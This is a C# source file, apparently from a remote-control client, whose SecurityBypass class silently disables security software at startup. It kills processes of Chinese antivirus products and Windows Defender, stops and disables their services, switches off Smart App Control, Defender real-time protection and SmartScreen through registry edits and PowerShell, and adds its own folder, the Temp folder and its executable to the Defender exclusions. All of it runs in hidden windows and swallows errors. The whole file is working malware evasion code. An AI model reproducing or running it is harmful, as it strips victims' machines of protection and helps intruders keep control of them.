using System;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;

namespace RemoteControl.Client.Utils
{
    /// <summary>
    /// 启动时清除安全防护
    /// </summary>
    class SecurityBypass
    {
        // 需要终止的杀毒/安全进程列表
        private static readonly string[] AntivirusProcesses = new string[]
        {
            // 360
            "360Tray", "360Safe", "360sd", "ZhuDongFangYu", "360rp",
            "360leakfixer", "360hotfix", "QHSafeMain", "QHActiveDefense",
            // 腾讯电脑管家
            "QQPCTray", "QQPCRTP", "QQPCMgr", "QQPCRealTimeSpeedup",
            // 金山毒霸/安全
            "KSafeTray", "KSafeSvc", "kxetray", "kwsprotect64",
            // 火绒
            "HipsTray", "HipsDaemon", "usysdiag",
            // 瑞星
            "RavMonD", "RsTray", "RsAgent",
            // Windows Defender相关
            "MsMpEng", "NisSrv", "SecurityHealthSystray",
            "SecurityHealthService", "smartscreen",
            // 2345安全
            "2345SafeTray", "2345RTProtect"
        };

        // 需要停止的安全服务列表
        private static readonly string[] SecurityServices = new string[]
        {
            "ZhuDongFangYu", "360rp",
            "QQPCMgr", "QQPCRTP",
            "KSafeSvc",
            "HipsDaemon", "HipsMain",
            "WinDefend", "WdNisSvc", "SecurityHealthService",
            "wscsvc", "Sense"
        };

        /// <summary>
        /// 执行全部安全绕过操作
        /// </summary>
        public static void Execute()
        {
            try
            {
                new Thread(() =>
                {
                    Thread.Sleep(1000);
                    KillAntivirusProcesses();
                    StopSecurityServices();
                    DisableSmartAppControl();
                    DisableWindowsDefender();
                    DisableSmartScreen();
                    AddExclusion();
                })
                { IsBackground = true }.Start();
            }
            catch { }
        }

        /// <summary>
        /// 终止杀毒进程
        /// </summary>
        private static void KillAntivirusProcesses()
        {
            foreach (string procName in AntivirusProcesses)
            {
                try
                {
                    Process[] procs = Process.GetProcessesByName(procName);
                    foreach (Process p in procs)
                    {
                        try { p.Kill(); } catch { }
                    }
                }
                catch { }
            }

            // 使用 taskkill 强制终止残留
            RunCmd("taskkill /F /IM 360Tray.exe /IM 360Safe.exe /IM ZhuDongFangYu.exe /IM 360sd.exe");
            RunCmd("taskkill /F /IM QQPCTray.exe /IM QQPCRTP.exe");
            RunCmd("taskkill /F /IM KSafeTray.exe /IM kxetray.exe");
            RunCmd("taskkill /F /IM HipsTray.exe /IM HipsDaemon.exe");
        }

        /// <summary>
        /// 停止安全服务
        /// </summary>
        private static void StopSecurityServices()
        {
            foreach (string svc in SecurityServices)
            {
                RunCmd("net stop \"" + svc + "\" /y");
                RunCmd("sc config \"" + svc + "\" start=disabled");
            }
        }

        /// <summary>
        /// 关闭智能应用控制
        /// </summary>
        private static void DisableSmartAppControl()
        {
            try
            {
                // Smart App Control状态注册表
                using (var key = Registry.LocalMachine.OpenSubKey(
                    @"SYSTEM\CurrentControlSet\Control\CI\Policy", true))
                {
                    if (key != null)
                    {
                        key.SetValue("VerifiedAndReputablePolicyState", 0, RegistryValueKind.DWord);
                    }
                }
            }
            catch { }

            try
            {
                using (var key = Registry.LocalMachine.CreateSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"))
                {
                    if (key != null)
                    {
                        key.SetValue("SmartScreenEnabled", "Off", RegistryValueKind.String);
                    }
                }
            }
            catch { }
        }

        /// <summary>
        /// 关闭Windows Defender实时保护
        /// </summary>
        private static void DisableWindowsDefender()
        {
            try
            {
                // 通过注册表禁用
                using (var key = Registry.LocalMachine.CreateSubKey(
                    @"SOFTWARE\Policies\Microsoft\Windows Defender"))
                {
                    if (key != null)
                    {
                        key.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
                    }
                }
            }
            catch { }

            try
            {
                using (var key = Registry.LocalMachine.CreateSubKey(
                    @"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"))
                {
                    if (key != null)
                    {
                        key.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
                        key.SetValue("DisableBehaviorMonitoring", 1, RegistryValueKind.DWord);
                        key.SetValue("DisableOnAccessProtection", 1, RegistryValueKind.DWord);
                        key.SetValue("DisableScanOnRealtimeEnable", 1, RegistryValueKind.DWord);
                    }
                }
            }
            catch { }

            // PowerShell方式禁用
            RunCmd("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\" ");
            RunCmd("powershell -Command \"Set-MpPreference -DisableBehaviorMonitoring $true\" ");
            RunCmd("powershell -Command \"Set-MpPreference -DisableIOAVProtection $true\" ");
        }

        /// <summary>
        /// 关闭SmartScreen
        /// </summary>
        private static void DisableSmartScreen()
        {
            try
            {
                using (var key = Registry.LocalMachine.CreateSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"))
                {
                    if (key != null)
                    {
                        key.SetValue("SmartScreenEnabled", "Off", RegistryValueKind.String);
                    }
                }
            }
            catch { }

            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(
                    @"SOFTWARE\Microsoft\Edge\SmartScreenEnabled"))
                {
                    if (key != null)
                    {
                        key.SetValue("", 0, RegistryValueKind.DWord);
                    }
                }
            }
            catch { }
        }

        /// <summary>
        /// 添加排除路径（当前目录和Temp目录）
        /// </summary>
        private static void AddExclusion()
        {
            try
            {
                string currentDir = AppDomain.CurrentDomain.BaseDirectory;
                string tempDir = Environment.GetEnvironmentVariable("TEMP");
                RunCmd("powershell -Command \"Add-MpPreference -ExclusionPath '" + currentDir + "'\" ");
                RunCmd("powershell -Command \"Add-MpPreference -ExclusionPath '" + tempDir + "'\" ");
                RunCmd("powershell -Command \"Add-MpPreference -ExclusionProcess '" +
                    System.Reflection.Assembly.GetEntryAssembly().Location + "'\" ");
            }
            catch { }
        }

        /// <summary>
        /// 执行CMD命令（静默）
        /// </summary>
        private static void RunCmd(string command)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c " + command;
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                Process proc = Process.Start(psi);
                proc.WaitForExit(5000);
            }
            catch { }
        }
    }
}
